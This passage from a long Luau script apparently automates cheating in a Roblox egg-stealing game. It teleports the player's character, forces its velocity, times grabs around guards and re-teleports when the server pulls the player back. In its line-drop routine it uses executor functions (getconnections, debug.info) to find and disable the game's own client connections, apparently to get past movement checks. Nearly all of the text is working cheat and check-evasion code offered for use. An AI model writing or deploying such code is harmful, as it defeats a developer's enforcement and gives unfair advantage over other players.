					local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
					world = world and world:FindFirstChild("Areas")
					world = world and world:FindFirstChild("SeparationLine")
					local x = world and world:IsA("BasePart") and world.Position.X or 552
					local v26 = stealHome()
					local position2 = tbl4.Root()
					local str4 = "field"
					local z = position2 and position2.Position.Z or position.Z

					if position2 and v26 and position2.Position.X < x - 2 then
						z = v26.Z

						if (Vector3.new(position2.Position.X, 0, position2.Position.Z) - Vector3.new(v26.X, 0, v26.Z)).Magnitude > 20 then
							str4 = "safe"
						end
					end

					local n23 = math.clamp(z + v25.Lane, -425, -300)
					local n24 = position.Y + 3

					local function fn57(arg3)
						local v27 = tbl4.Root()
						local character2 = localPlayer.Character
						local flag5 = not v27 or not character2 or math.abs(v27.Position.Y - arg3) < 1
						local flag6

						if flag5 then
							flag6 = flag5
						else
							local snapLimit = safeCarry.SnapLimit
							flag6 = math.abs(v27.Position.Y - arg3) > snapLimit
						end

						if flag6 then
							return false
						end

						pcall(function()
							local rotation = v27.CFrame.Rotation
							character2:PivotTo(CFrame.new(Vector3.new(v27.Position.X, arg3, v27.Position.Z)) * rotation)
							v27.AssemblyLinearVelocity = Vector3.new(v27.AssemblyLinearVelocity.X, 0, v27.AssemblyLinearVelocity.Z)
						end)

						return true
					end

					local function fn58()
						if safeCarry.RunHeight <= 0.5 then
							return
						end
						fn57(n24 + safeCarry.RunHeight)
					end

					if str4 == "field" then
						fn58()
					end

					local now = os.clock()
					local now2 = os.clock()
					local now3 = os.clock()
					position2 = position2 and position2.Position or nil

					local function fn59(arg3, arg4, arg5, arg6)
						local vector = Vector3.new(arg4.X - arg3.Position.X, 0, arg4.Z - arg3.Position.Z)
						local magnitude = vector.Magnitude
						local unit = magnitude > 0.01 and vector.Unit or Vector3.zero

						if safeCarry.RunHeight > 0.5 and str4 == "field" and not arg6 then
							local runSpeed = safeCarry.RunSpeed
							local n25 = math.max(tbl4.WalkSpeed() * runSpeed * arg5, 8)
							local n26 = math.clamp(safeCarry.ClimbShare, 0.1, 0.9)
							local magnitude2 = Vector3.new(position.X - arg3.Position.X, 0, position.Z - arg3.Position.Z).Magnitude

							if magnitude2 <= 3 then
								if fn57(n24) then
									return
								end
							end

							local n27 = magnitude2 <= 3 and n24 or n24 + safeCarry.RunHeight
							if math.abs(n27 - arg3.Position.Y) > 2 and fn57(n27) then
								return
							end
							local n28 = math.clamp((n27 - arg3.Position.Y) / 0.12, -n25 * n26, n25 * n26)
							local n29 = unit * math.min(math.sqrt(math.max(n25 * n25 - n28 * n28, 0)), magnitude / 0.05)

							pcall(function()
								arg3.AssemblyLinearVelocity = Vector3.new(n29.X, n28, n29.Z)
							end)

							return
						end

						pcall(function()
							if arg6 or magnitude <= 0.01 then
								if humanoid then
									if safeCarry.RunStyle == "Walk" then
										humanoid:MoveTo(arg3.Position)
									end

									humanoid:Move(Vector3.zero, false)
								end

								if safeCarry.RunStyle ~= "Walk" then
									arg3.AssemblyLinearVelocity = Vector3.new(0, arg3.AssemblyLinearVelocity.Y, 0)
								end
							elseif safeCarry.RunStyle == "Walk" then
								if humanoid then
									humanoid:MoveTo(arg3.Position + unit * math.min(magnitude, 30))
								end
							else
								local runSpeed = safeCarry.RunSpeed
								local n25 = unit * math.min(math.max(tbl4.WalkSpeed() * runSpeed * arg5, 8), magnitude / 0.05)
								arg3.AssemblyLinearVelocity = Vector3.new(n25.X, arg3.AssemblyLinearVelocity.Y, n25.Z)

								if safeCarry.RunAnimate and humanoid then
									humanoid:Move(unit, false)
								end
							end
						end)
					end

					while os.clock() - now < 240 do
						if fn16(arg2) then
							return false
						end
						local v27 = tbl4.Root()
						if not v27 then
							return false
						end
						local now4 = os.clock()
						local n25 = math.max(now4 - now2, 0.0041666666666666666)
						local vector = Vector3.new(position.X - v27.Position.X, 0, position.Z - v27.Position.Z)
						if str4 == "field" and vector.Magnitude <= 2.5 and (safeCarry.RunHeight <= 0.5 or v27.Position.Y - n24 < 4) then
							break
						end
						local v28, v29, flag5 = v25.Step(n25, humanoid, humanoid and humanoid.FloorMaterial ~= Enum.Material.Air)

						if vector.Magnitude <= 15 then
							flag5 = false
						end

						local vector2 = position

						if str4 == "safe" and v26 then
							if (Vector3.new(v26.X, 0, v26.Z) - Vector3.new(v27.Position.X, 0, v27.Position.Z)).Magnitude <= 6 then
								str4 = "field"
								fn58()
							end

							str3 = "Walking out to the safe zone"
							vector2 = v26
						else
							if not safeCarry.StraightRun and safeCarry.RunHeight <= 0.5 and math.abs(position.X - v27.Position.X) > 25 then
								vector2 = Vector3.new(position.X, position.Y, math.clamp(n23 + v29, -425, -300))
							end

							str3 = string.format("Running to the egg, %d studs left", math.floor(vector.Magnitude + 0.5))
						end

						local v30, v31 = safeCarry.Avoid(v27.Position, vector2)

						if v31 then
							str3 = "Walking around " .. tostring(v31)
						end

						fn59(v27, v30, v28, flag5)

						if now4 - now3 >= 1.5 then
							if not flag5 and position2 and (v27.Position - position2).Magnitude < 3 and humanoid then
								pcall(function()
									humanoid.Jump = true
								end)
							end

							position2 = v27.Position
							now3 = now4
						end

						RunService.Heartbeat:Wait()
						now2 = now4
					end

					local v27 = tbl4.Root()

					if v27 then
						fn59(v27, v27.Position, 1, true)
					end

					local vector = nil

					if v27 then
						local vector2 = Vector3.new(v27.Position.X - position.X, 0, v27.Position.Z - position.Z)
						local vector3 = vector2.Magnitude > 0.1 and vector2.Unit * 2 or Vector3.zero
						vector = Vector3.new(position.X + vector3.X, v27.Position.Y, position.Z + vector3.Z)
					end

					local connection = RunService.Heartbeat:Connect(function()
						local v28 = tbl4.Root()
						if not v28 or not vector or tbl4.Steal.Carrying or tbl4.AntiGuard.Busy then
							return
						end
						local vector2 = Vector3.new(vector.X - v28.Position.X, 0, vector.Z - v28.Position.Z)

						pcall(function()
							if vector2.Magnitude > 1.5 then
								local rotation = v28.CFrame.Rotation
								v28.CFrame = CFrame.new(vector.X, v28.Position.Y, vector.Z) * rotation
							end

							v28.AssemblyLinearVelocity = Vector3.new(0, math.min(v28.AssemblyLinearVelocity.Y, 0), 0)
						end)
					end)

					local function fn60(arg3)
						connection:Disconnect()
						return arg3
					end

					local v28 = fn45(arg)
					local now4 = os.clock()
					local v29 = safeCarry.React(safeCarry.ReactMin, safeCarry.ReactMax)

					while true do
						if fn16(arg2) then
							return (fn60(false))
						else
							local n25 = os.clock() - now4
							local n26 = safeCarry.RunWait + v29
							local flag5 = not safeCarry.WaitGuard or not v28 or v28:GetAttribute("GuardState") == "Sleeping"
							if n25 >= n26 and (flag5 or n25 >= n26 + 15) then
								break
							end
							str3 = n25 < n26 and string.format("Waiting before the grab, %.1fs", n26 - n25) or "Waiting for the guard to sleep"
							RunService.Heartbeat:Wait()
						end
					end

					str3 = "Taking the egg"
					local v30 = fn47(arg, arg2, 0.8, nil)

					if not v30 and not fn16(arg2) then
						v30 = fn33(arg, arg2)
					end

					fn60()
					if not v30 then
						return false
					end
					tbl4.Steal.LastFinishedAt = os.clock()
					return true
				end

				tbl4.SafeCarry.Pace = function()
					local n23 = tonumber(tbl4.SafeCarry.RunSpeed) or 1
					return math.max(tbl4.WalkSpeed() * n23, 16)
				end

				tbl4.SafeCarry.Plan = function(arg, arg2, arg3)
					local safeCarry = tbl4.SafeCarry
					local character = localPlayer.Character

					if character then
						character:FindFirstChildOfClass("Humanoid")
					end

					local v25 = tbl4.WalkSpeed()
					arg3 = arg3 or safeCarry.Mult or 1

					if safeCarry.SameSpeedBigEggs then
						arg3 = math.max(arg3, safeCarry.LightMult)
					end

					local n23 = v25 * safeCarry.CarryRatio * arg3
					local n24 = n23 * safeCarry.SpeedRatio
					local n25 = safeCarry.ExcessSeconds * n23
					local n26

					if arg2 and arg2 > n25 then
						n26 = math.min(n24, n23 * arg2 / (arg2 - n25))
					else
						n26 = n24
					end

					local guards = tbl.Guards
					local flag5 = type(guards) == "table" and type(guards.Directory) == "table" and guards.Directory[tostring(arg)] or nil
					local n27 = type(flag5) == "table" and tonumber(flag5.WalkSpeed) or 0
					if not safeCarry.BeatGuard then
						return math.max(math.min(n23 * safeCarry.EasyRatio, n26), n23), true, n23, n26, n27
					end
					local n28 = math.max(n27 + safeCarry.GuardMargin, n23 * safeCarry.MinRatio)
					local n29 = math.max(n28, n27 * safeCarry.GuardRatio)

					if n26 < n28 then
						local n30 = n23 * safeCarry.SpeedRatio
						local n31 = safeCarry.StretchSeconds * n23
						local n32

						if arg2 and arg2 > n31 then
							n32 = math.min(n30, n23 * arg2 / (arg2 - n31))
						else
							n32 = n30
						end

						local n33 = n27 + math.max(safeCarry.GuardMargin, 1)
						if n33 <= n32 then
							return n33, true, n23, n32, n27
						end
					end

					return math.max(math.min(n29, n26), n23), n28 <= n26, n23, n26, n27
				end

				tbl4.SafeCarry.Unsafe = function(arg)
					local safeCarry = tbl4.SafeCarry
					if not safeCarry.Enabled or type(arg) ~= "table" or not arg.Uid or not safeCarry.Blocked[arg.Uid] then
						return nil
					end
					return string.format("the guard caught you with this %s before, skipping it", tostring(arg.Category))
				end

				tbl4.SafeCarry.Settle = function(arg, arg2)
					local safeCarry = tbl4.SafeCarry
					local character = localPlayer.Character

					if character then
						character:FindFirstChildOfClass("Humanoid")
					end

					math.max(tbl4.WalkSpeed() * safeCarry.CarryRatio * (safeCarry.Seen[tostring(arg2.Category)] or safeCarry.GuessMult) * safeCarry.WaitRate, 1)
					local baseWait = safeCarry.BaseWait
					local v25 = fn45(arg2)

					while true do
						if fn16(arg) then
							return false
						else
							local n23 = os.clock() - (safeCarry.JumpAt or 0)
							local flag5 = not safeCarry.WaitGuard or not v25 or v25:GetAttribute("GuardState") == "Sleeping"
							if n23 >= baseWait and (flag5 or n23 >= baseWait + 15) then
								break
							end

							if n23 < baseWait then
								str3 = string.format("Letting the jump settle, %.1fs", baseWait - n23)
							else
								str3 = "Waiting for the guard to sleep"
							end

							RunService.Heartbeat:Wait()
						end
					end

					return true
				end

				tbl4.MonitorAction = tbl4.MonitorAction or function(arg)
					local ok, result = pcall(debug.getconstants, arg)
					if not ok or type(result) ~= "table" then
						return false
					end

					for _, v25 in pairs(result) do
						local flag5 = type(v25) == "string"

						if flag5 then
							flag5 = v25 == "Relocate" or v25 == "SetWalkSpeed" or v25 == "BeginRagdoll" or v25 == "EndRagdoll" or v25 == "BeginImpulse"
						end

						if flag5 then
							return true
						end
					end

					return false
				end

				tbl4.SafeCarry.LineDropHome = function(arg)
					local safeCarry = tbl4.SafeCarry
					local steal = tbl4.Steal
					local carryUid = steal.CarryUid
					local v25 = stealHome()
					local v26 = tbl4.Root()
					if type(carryUid) ~= "string" or not v25 or not v26 then
						return false
					end
					local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
					world = world and world:FindFirstChild("Areas")
					world = world and world:FindFirstChild("SeparationLine")
					local x = world and world:IsA("BasePart") and world.Position.X or 552.2
					local y = world and world:IsA("BasePart") and world.Position.Y or 67.67
					local tbl38 = {}

					pcall(function()
						for _, v27 in ipairs({ RunService.Heartbeat, RunService.PreSimulation, RunService.PostSimulation }) do
							for _, v28 in ipairs(getconnections(v27)) do
								local ok, result = pcall(function()
									return v28.Function
								end)

								if ok and type(result) == "function" then
									local ok2, result2 = pcall(debug.info, result, "s")

									if ok2 and string.find(tostring(result2), "UGI", 1, true) and not tbl4.MonitorAction(result) then
										local ok3, result3 = pcall(function()
											return v28.Enabled
										end)

										if not ok3 or result3 ~= false then
											if pcall(function()
												v28:Disable()
											end) then
												table.insert(tbl38, v28)
											end
										end
									end
								end
							end
						end
					end)

					local flag5 = false
					local connection = nil

					pcall(function()
						connection = networking["RE/RigSync/Refresh"].OnClientEvent:Connect(function(arg2)
							if type(arg2) == "table" and arg2.Action == "Relocate" then
								flag5 = true
							end
						end)
					end)

					local currentCamera = workspace.CurrentCamera
					local tbl39 = nil

					local function fn57()
						local v27 = tbl39
						local flag6

						if tbl39 then
							flag6 = v27
						else
							flag6 = not currentCamera
						end

						if flag6 then
							return
						end
						tbl39 = { Type = currentCamera.CameraType, CFrame = currentCamera.CFrame }

						pcall(function()
							currentCamera.CameraType = Enum.CameraType.Scriptable
							currentCamera.CFrame = tbl39.CFrame
						end)
					end

					local function fn58()
						if not tbl39 or not currentCamera then
							return
						end
						local v27 = tbl39
						tbl39 = nil

						pcall(function()
							currentCamera.CameraType = v27.Type
						end)
					end

					local function fn59()
						fn58()

						if connection then
							connection:Disconnect()
							connection = nil
						end

						for _, v27 in ipairs(tbl38) do
							pcall(function()
								v27:Enable()
							end)
						end

						table.clear(tbl38)
					end

					local now = os.clock()

					local function fn60(arg2, arg3, arg4, arg5)
						local n23 = 0

						while n23 < arg4 and not fn16(arg) do
							local v27 = tbl4.Root()
							if not v27 then
								return false
							end

							if arg5 and arg5() then
								return true
							end
							local vector = Vector3.new(arg2.X - v27.Position.X, 0, arg2.Z - v27.Position.Z)
							if vector.Magnitude < 2.5 then
								return true
							end
							local n24 = vector.Unit * math.min(arg3, vector.Magnitude / 0.05)

							pcall(function()
								v27.AssemblyLinearVelocity = Vector3.new(n24.X, v27.AssemblyLinearVelocity.Y, n24.Z)
							end)

							n23 += RunService.Heartbeat:Wait()
						end

						return false
					end

					fn25()
					local n23 = math.clamp(v26.Position.Z, -425, -300)
					local vector = Vector3.new(x + (safeCarry.Hops and safeCarry.HopStop or safeCarry.LineGap), y + 3.35, n23)

					local function fn61()
						local rfEggWorldAskFieldEggSnapshot = networking:FindFirstChild("RF/EggWorld/AskFieldEggSnapshot")

						local ok, result = pcall(function()
							return rfEggWorldAskFieldEggSnapshot:InvokeServer()
						end)

						local records = ok and type(result) == "table" and result.Records or nil

						if type(records) == "table" then
							for _, record in pairs(records) do
								if type(record) == "table" and record.Uid == carryUid then
									return record
								end
							end
						end

						return nil
					end

					local magnitude = Vector3.new(v26.Position.X - x, 0, v26.Position.Z - n23).Magnitude
					local max = math.max
					local carryRatio = safeCarry.CarryRatio
					local v27 = max(tbl4.WalkSpeed() * carryRatio * (tonumber(safeCarry.Mult) or safeCarry.LightMult), 1)
					local directMargin = safeCarry.DirectMargin
					local n24 = math.max(0, (magnitude - safeCarry.DirectBudget) / v27) + directMargin

					if safeCarry.CrossNow then
						n24 = safeCarry.DirectMargin
					end

					local function fn62()
						local v28 = tbl4.Root()
						if not v28 then
							return
						end

						pcall(function()
							v28.CFrame = CFrame.new(vector) * CFrame.Angles(0, 1.5707963267948966, 0)
							v28.AssemblyLinearVelocity = Vector3.zero
							v28.AssemblyAngularVelocity = Vector3.zero
						end)
					end

					fn57()

					if safeCarry.Hops then
						local v28 = tbl4.Root()

						if v28 then
							local n25 = v28.Position.Y + safeCarry.HopLift
							local x2 = v28.Position.X
							local hopRatio = safeCarry.HopRatio
							local n26 = math.max(tbl4.WalkSpeed() * hopRatio, 40)

							while x2 - n26 > vector.X and steal.Carrying and not fn16(arg) do
								x2 -= n26
								str3 = string.format("Line Drop: hopping home, X %d", math.floor(x2))
								local n27 = 0

								while n27 < safeCarry.HopGap do
									local v29 = tbl4.Root()

									if v29 then
										pcall(function()
											v29.CFrame = CFrame.new(x2, n25, n23) * CFrame.Angles(0, 1.5707963267948966, 0)
											v29.AssemblyLinearVelocity = Vector3.zero
											v29.AssemblyAngularVelocity = Vector3.zero
										end)
									end

									n27 += RunService.Heartbeat:Wait()
								end
							end
						end
					end

					str3 = "Line Drop: landing next to the line"
					fn62()

					if safeCarry.Hops and steal.Carrying then
						local n25 = 0

						while n25 < safeCarry.DropDelay and steal.Carrying and not fn16(arg) do
							n25 += RunService.Heartbeat:Wait()
						end

						if steal.Carrying then
							str3 = "Line Drop: dropping the egg next to the line"
							local eggState = tbl.EggState

							if type(eggState) == "table" and type(eggState.DropFieldEgg) == "function" then
								pcall(eggState.DropFieldEgg, "PlayerRequest")
							end

							local n26 = 0

							while steal.Carrying and n26 < 1 and not fn16(arg) do
								n26 += RunService.Heartbeat:Wait()
							end
						end
					end

					fn58()

					if safeCarry.ShakeTime > 0 then
						local vector2 = Vector3.new(x - safeCarry.ShakeInside, vector.Y, n23)
						local flag6 = false
						local n25 = 0

						while n25 < safeCarry.ShakeTime and steal.Carrying and not fn16(arg) do
							str3 = "Line Drop: shaking at the line"
							flag6 = not flag6
							local v28 = tbl4.Root()

							if v28 then
								pcall(function()
									v28.CFrame = CFrame.new(flag6 and vector2 or vector) * CFrame.Angles(0, 1.5707963267948966, 0)
									v28.AssemblyLinearVelocity = Vector3.zero
								end)
							end

							n25 += RunService.Heartbeat:Wait()
						end

						fn62()
					end

					local flag6 = n24 < safeCarry.LineWait
					local n25 = 0
					local n26 = 1

					while true do
						local flag7 = steal.Carrying and n25 < safeCarry.LineWait

						if flag7 then
							flag7 = not (flag6 and n25 >= n24)
						end

						if flag7 and not fn16(arg) then
							if flag6 then
								str3 = string.format("Line Drop: stepping over the line in %.1fs", math.max(n24 - n25, 0))
							else
								str3 = string.format("Line Drop: crossing needs %.1fs, waiting for the guard, %.0fs left", n24, safeCarry.LineWait - n25)
							end

							if flag5 and safeCarry.ReJump and n26 < 40 and not fn34() then
								flag5 = false
								n26 += 1
								str3 = "Line Drop: pulled back, jumping to the line again"
								fn62()
							end

							n25 += RunService.Heartbeat:Wait()
							continue
						end

						break
					end

					if steal.Carrying and flag6 and n25 >= n24 and not fn16(arg) then
						str3 = "Line Drop: stepping over the line"
						local crossRatio = safeCarry.CrossRatio

						fn60(v25, tbl4.WalkSpeed() * crossRatio, 6, function()
							return safeCarry.LastDelivered >= now or not steal.Carrying
						end)

						local n27 = 0

						while n27 < 1.5 and safeCarry.LastDelivered < now and steal.Carrying and not fn16(arg) do
							n27 += RunService.Heartbeat:Wait()
						end

						if now <= safeCarry.LastDelivered then
							fn59()
							return true
						end
					end

					if steal.Carrying then
						fn59()
						str3 = "Line Drop: the guard never came, dropping the egg"
						local eggState = tbl.EggState

						if type(eggState) == "table" and type(eggState.DropFieldEgg) == "function" then
							pcall(eggState.DropFieldEgg, "PlayerRequest")
						end

						return false
					end

					if safeCarry.GetUp then
						task.spawn(function()
							local n27 = 0

							while n27 < 1.5 do
								local character = localPlayer.Character
								local humanoid = character and character:FindFirstChildOfClass("Humanoid")

								if humanoid then
									pcall(function()
										humanoid.PlatformStand = false
										local state = humanoid:GetState()

										if state == Enum.HumanoidStateType.Physics or state == Enum.HumanoidStateType.Ragdoll or state == Enum.HumanoidStateType.FallingDown then
											humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
										end
									end)
								end

								n27 += RunService.Heartbeat:Wait()
							end
						end)
					end

					local n27 = 0

					while not safeCarry.SnapPickup and not safeCarry.GetUp and fn34() and n27 < 6 and not fn16(arg) do
						str3 = "Line Drop: egg is down at the line, getting up"
						n27 += RunService.Heartbeat:Wait()
					end

					local n28 = 0

					while not fn16(arg) and n28 < 4 do
						n28 += 1
						local v28 = fn51(carryUid)

						if not v28 then
							fn59()
							str3 = "Line Drop: the egg is gone"
							return false
						end

						local v29 = fn61()

						if v29 and v29.State == "Slot" then
							fn59()
							str3 = "Line Drop: the egg went back to its nest"
							return false
						end

						str3 = "Line Drop: picking the egg up at the line"
						local n29

						if safeCarry.SnapPickup then
							local v30 = tbl4.Root()

							if v30 then
								pcall(function()
									v30.CFrame = CFrame.new(v28 + Vector3.new(0, 3, 0)) * CFrame.Angles(0, 1.5707963267948966, 0)
									v30.AssemblyLinearVelocity = Vector3.zero
								end)
							end

							n29 = 5
						else
							local pickupRatio = safeCarry.PickupRatio
							fn60(v28, tbl4.WalkSpeed() * pickupRatio, 5)
							n29 = 2.5
						end

						local n30 = 0

						while not steal.Carrying and n30 < n29 and not fn16(arg) do
							task.spawn(fn31, carryUid)

							if safeCarry.SnapPickup then
								local v30 = tbl4.Root()

								if v30 and Vector3.new(v30.Position.X - v28.X, 0, v30.Position.Z - v28.Z).Magnitude > 6 then
									pcall(function()
										v30.CFrame = CFrame.new(v28 + Vector3.new(0, 3, 0)) * CFrame.Angles(0, 1.5707963267948966, 0)
									end)
								end
							end

							n30 += task.wait(0.15)
						end

						if steal.Carrying and not steal.WrongEgg(carryUid) then
							break
						end
					end

					if not steal.Carrying then
						fn59()
						str3 = "Line Drop: could not pick the egg up again"
						return false
					end

					local v28 = tbl4.Root()

					if v28 and v28.Position.X - x > safeCarry.FarFromLine then
						fn59()
						str3 = "Line Drop: egg ended up far from the line, carrying it home safely"
						return tbl4.SafeCarry.Home(arg)
					end

					str3 = "Line Drop: stepping over the line"
					local crossRatio = safeCarry.CrossRatio

					fn60(v25, tbl4.WalkSpeed() * crossRatio, 6, function()
						return safeCarry.LastDelivered >= now or not steal.Carrying
					end)

					local v29 = tbl4.Root()

					if v29 then
						pcall(function()
							v29.AssemblyLinearVelocity = Vector3.new(0, v29.AssemblyLinearVelocity.Y, 0)
						end)
					end

					local n29 = 0

					while n29 < 2 and safeCarry.LastDelivered < now and steal.Carrying and not fn16(arg) do
						n29 += RunService.Heartbeat:Wait()
					end

					fn59()
					return safeCarry.LastDelivered >= now
				end

				tbl4.SafeCarry.Home = function(arg)
					local safeCarry = tbl4.SafeCarry
					local v25 = stealHome()
					local v26 = tbl4.Root()
					if not v25 or not v26 then
						return false
					end
					fn25()
					local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
					world = world and world:FindFirstChild("Areas")
					world = world and world:FindFirstChild("SeparationLine")
					local n23 = (world and world:IsA("BasePart") and world.Position.X or 552) - 7
					local character = localPlayer.Character
					local humanoid = character and character:FindFirstChildOfClass("Humanoid")

					if humanoid then
						humanoid.PlatformStand = false
					end

					local now = os.clock()
					local n24 = 0

					local function fn57()
						local v27 = tbl4.Root()
						if not v27 then
							return
						end
						local v28, v29, v30, v31, v32 = safeCarry.Plan(tbl4.Steal.CarryAreaId, (Vector3.new(v27.Position.X, 0, v27.Position.Z) - Vector3.new(v25.X, 0, v25.Z)).Magnitude + math.max(0, safeCarry.Height) * 2, safeCarry.Mult)
						local n25 = v28 * safeCarry.CarryScale
						n24 = n25
						safeCarry.PlanOk = v29
						safeCarry.FloorSpeed = safeCarry.BeatGuard and math.min(v32 + math.max(safeCarry.GuardMargin, 1), v31) or 0
						str3 = string.format("Carrying home at %d (carry %d, guard %d, max %d)%s", math.floor(n25 + 0.5), math.floor(v30 + 0.5), math.floor(v32 + 0.5), math.floor(v31 + 0.5), v29 and "" or ", guard is faster, going at your max safe speed")
					end

					local function fn58()
						local n25 = math.max(0, safeCarry.Height)
						local v27 = tbl4.Root()
						local character2 = localPlayer.Character
						if n25 <= 0.5 or not v27 or not character2 then
							return
						end
						local n26 = v25.Y + n25
						if v27.Position.Y >= n26 - 2 then
							return
						end
						local rotation = v27.CFrame.Rotation
						local n27 = CFrame.new(Vector3.new(v27.Position.X, n26, v27.Position.Z)) * rotation

						pcall(function()
							character2:PivotTo(n27)
							v27.AssemblyLinearVelocity = Vector3.zero
							v27.AssemblyAngularVelocity = Vector3.zero
						end)
					end

					fn57()
					local v27 = safeCarry.NewHuman(true)
					local v28 = tbl4.Root()
					local n25 = math.clamp((v28 and v28.Position.Z or v25.Z) + v27.Lane, -425, -300)
					local now2 = os.clock()

					if safeCarry.CarryReact > 0 then
						local n26 = os.clock() + safeCarry.React(0, safeCarry.CarryReact)

						while os.clock() < n26 and not fn16(arg) do
							RunService.Heartbeat:Wait()
						end
					end

					local n26 = 0

					if safeCarry.CarryStyle ~= "Walk" then
						fn58()
					end

					while not fn16(arg) do
						local v29 = tbl4.Root()
						if not v29 then
							return false
						end

						if not tbl4.Steal.Carrying then
							if now <= safeCarry.LastDelivered then
								return true
							end
							task.wait(0.1)
							if now <= safeCarry.LastDelivered then
								return true
							end

							if safeCarry.LastFailed >= now then
								str3 = "Delivery was rewound, too fast for your speed"
								return false
							end

							if not safeCarry.PlanOk and tbl4.Steal.CarryUid then
								safeCarry.Blocked[tbl4.Steal.CarryUid] = true
								str3 = string.format("The guard caught you with %s, it is faster than your max safe speed, skipping this egg", tostring(safeCarry.Category))
								return false
							end

							n26 += 1
							if safeCarry.RecoverTries < n26 then
								str3 = "The egg is gone"
								return false
							end
							str3 = "Egg dropped, taking it back"
							if not fn53(arg) then
								str3 = "Could not take the egg back"
								return false
							end
							local n27 = 0

							while fn34() and n27 < 4 and not fn16(arg) do
								n27 += RunService.Heartbeat:Wait()
							end

							local n28 = math.min(now, os.clock())
							fn57()

							if safeCarry.CarryStyle ~= "Walk" then
								fn58()
							end

							v29 = tbl4.Root()
							if not v29 then
								return false
							end
							now = n28
						end

						local now3 = os.clock()
						local n27 = math.max(now3 - now2, 0.0041666666666666666)
						local flag5 = safeCarry.CarryStyle == "Walk"
						local n28 = flag5 and 0 or math.max(0, safeCarry.Height)
						local v30, v31 = v27.Step(n27, n28 <= 0.5 and humanoid or nil, humanoid and humanoid.FloorMaterial ~= Enum.Material.Air)
						local n29 = math.clamp(n25 + v31, -425, -300)
						local vector = v29.Position.X > n23 + 2 and Vector3.new(n23, v29.Position.Y, n29) or v25
						local v32, v33 = safeCarry.Avoid(v29.Position, vector)

						if v33 then
							vector = v32
						end

						local vector2 = Vector3.new(vector.X - v29.Position.X, 0, vector.Z - v29.Position.Z)
						if vector2.Magnitude < 2 and vector == v25 then
							break
						end
						local n30 = math.max(n24 * v30, safeCarry.FloorSpeed or 0)

						if os.clock() < (safeCarry.SlowUntil or 0) then
							n30 *= safeCarry.SlowFactor
						end

						if flag5 then
							pcall(function()
								if humanoid and vector2.Magnitude > 0.01 then
									humanoid:MoveTo(v29.Position + vector2.Unit * math.min(vector2.Magnitude, 30))
								end
							end)
						elseif n28 > 0.5 then
							local n31 = math.clamp(safeCarry.ClimbShare, 0.1, 0.9)
							local y = v25.Y
							local n32 = math.max(0, v29.Position.X - n23)
							local n33 = n28 * math.sqrt(1 - n31 * n31) / n31
							local n34 = y + n28

							if vector == v25 or n32 <= n33 then
								n34 = y + n28 * math.clamp((vector == v25 and 0 or n32) / math.max(n33, 1), 0, 1)
							end

							local n35 = math.clamp((n34 - v29.Position.Y) / 0.12, -n30 * n31, n30 * n31)
							local v34 = math.sqrt(math.max(n30 * n30 - n35 * n35, 0))
							local vector3 = vector2.Magnitude > 0.01 and vector2.Unit * math.min(v34, vector2.Magnitude / 0.05) or Vector3.zero

							pcall(function()
								v29.AssemblyLinearVelocity = Vector3.new(vector3.X, n35, vector3.Z)
							end)
						else
							local vector3 = vector2.Magnitude > 0.01 and vector2.Unit * math.min(n30, vector2.Magnitude / 0.05) or Vector3.zero

							pcall(function()
								v29.AssemblyLinearVelocity = Vector3.new(vector3.X, v29.AssemblyLinearVelocity.Y, vector3.Z)

								if safeCarry.RunAnimate and humanoid and vector2.Magnitude > 0.01 then
									humanoid:Move(vector2.Unit, false)
								end
							end)
						end

						RunService.Heartbeat:Wait()
						now2 = now3
					end

					if humanoid then
						pcall(function()
							local v29 = tbl4.Root()

							if safeCarry.CarryStyle == "Walk" and v29 then
								humanoid:MoveTo(v29.Position)
							end

							humanoid:Move(Vector3.zero, false)
						end)
					end

					local n27 = 0

					while n27 < 2 and not fn16(arg) do
						if now <= safeCarry.LastDelivered then
							return true
						end

						if safeCarry.LastFailed >= now then
							str3 = "Delivery was rewound, too fast for your speed"
							return false
						end

						if not tbl4.Steal.Carrying then
							break
						end
						n27 += RunService.Heartbeat:Wait()
					end

					if tbl4.Steal.Carrying then
						task.wait(0.2)
						local eggState = tbl.EggState

						if type(eggState) == "table" and type(eggState.DropFieldEgg) == "function" then
							pcall(eggState.DropFieldEgg, "PlayerRequest")
						end
					end

					return safeCarry.LastDelivered >= now
				end

				local function fn57(arg)
					local antiGuard = tbl4.AntiGuard

					if antiGuard.Enabled and not tbl4.SafeCarry.LineDrop and not tbl4.BossPortalUp() then
						local n23 = 0

						while not antiGuard.Busy and n23 < 1 and not fn16(arg) do
							str3 = "Waiting for Anti Guard to start"
							n23 += RunService.Heartbeat:Wait()
						end

						local busy = antiGuard.Busy
						local n24 = 0

						while antiGuard.Busy and n24 < 30 and not fn16(arg) do
							str3 = "Anti Guard is slipping past the guard"
							n24 += RunService.Heartbeat:Wait()
						end

						if busy then
							local n25 = 0
							local n26 = 0

							while n25 < 10 and not fn16(arg) do
								local v25 = fn34()
								local ok, result = pcall(tbl4.Steal.HeldByMe)
								ok = ok and result == true
								local flag5 = not v25
								if flag5 and not ok then
									break
								end

								if flag5 and ok and not antiGuard.Busy then
									n26 += RunService.Heartbeat:Wait()
									if n26 >= 0.3 then
										break
									end
									continue
								end

								str3 = v25 and "The guard hit you, waiting until you can move" or "Waiting for Anti Guard to finish"
								n25 += RunService.Heartbeat:Wait()
								n26 = 0
							end

							local ok, result = pcall(tbl4.Steal.HeldByMe)

							if ok and not result then
								tbl4.Steal.Carrying = false
							end

							local safeCarry = tbl4.SafeCarry
							local v25 = stealHome()
							local n27 = v25 and safeCarry.Enabled and safeCarry.CarryStyle ~= "Walk" and safeCarry.Height > 0.5 and v25.Y + safeCarry.Height or nil
							local n28 = 0

							while n28 < 0.8 and tbl4.Steal.Carrying and not fn16(arg) do
								str3 = n28 < 0.6 and "Anti Guard done, rising up" or "Anti Guard done, getting ready"
								local v26 = tbl4.Root()

								if v26 and n27 then
									local n29 = n27 - v26.Position.Y
									local n30 = n28 < 0.6 and math.clamp(n29 / math.max(0.6 - n28, 0.1), -120, 120) or math.clamp(n29 / 0.2, -30, 30)

									pcall(function()
										v26.AssemblyLinearVelocity = Vector3.new(0, n30, 0)
									end)
								end

								n28 += RunService.Heartbeat:Wait()
							end

							local ok2, result2 = pcall(tbl4.Steal.HeldByMe)

							if ok2 and not result2 then
								tbl4.Steal.Carrying = false
							else
								tbl4.SafeCarry.SlowUntil = os.clock() + 2
							end
						end
					end

					local n23 = 0

